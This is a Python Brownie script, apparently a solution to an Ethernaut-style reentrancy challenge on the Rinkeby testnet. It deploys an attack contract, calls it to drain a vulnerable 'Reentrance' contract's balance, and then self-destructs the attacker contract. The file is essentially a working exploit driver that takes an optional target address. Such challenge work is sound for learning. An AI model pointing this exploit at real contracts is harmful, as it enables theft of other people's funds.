#!/usr/bin/python3
from brownie import Reentrance, Attack
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore
from web3 import Web3 as w3

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address : 0x402C04B14625dAcb8f8Db3e535b9B3E210C3dd79
AMOUNT = "0.001 ether"


def convert_fromWei(value):
    return w3.fromWei(value, "ether")


def reentrance(contract_address=None, attacker=None):
    if not contract_address:
        reentrance_contract, owner = deploy()
        contract_address = reentrance_contract.address
        _, attacker = get_account()
    else:
        reentrance_contract = Reentrance.at(contract_address)
    # print(contract_address)
    print(
        f"{green}Current Contract Balance -> {magenta}{convert_fromWei(reentrance_contract.balance())} ETH{reset}"
    )
    # exit(1)
    # * deploy the malicious contract
    atttack_contract = Attack.deploy(
        reentrance_contract.address, AMOUNT, {"from": attacker}
    )
    reentrance_contract.donate(
        atttack_contract.address, {"from": attacker, "amount": AMOUNT}
    )
    atttack_contract.attack({"from": attacker, "allow_revert": True})
    print(f"{red}Attack Successful!!!{reset}")
    print(
        f"{green}Current Contract Balance -> {magenta}{convert_fromWei(reentrance_contract.balance())} ETH{reset}"
    )
    atttack_contract.destroy()
    print(
        f"{green}Balance of the attacker: {red}{convert_fromWei(attacker.balance())}{reset} ETH"
    )


def main(contract_address=None):
    if contract_address:
        reentrance(contract_address, get_account())
    else:
        reentrance()


if __name__ == "__main__":
    main()
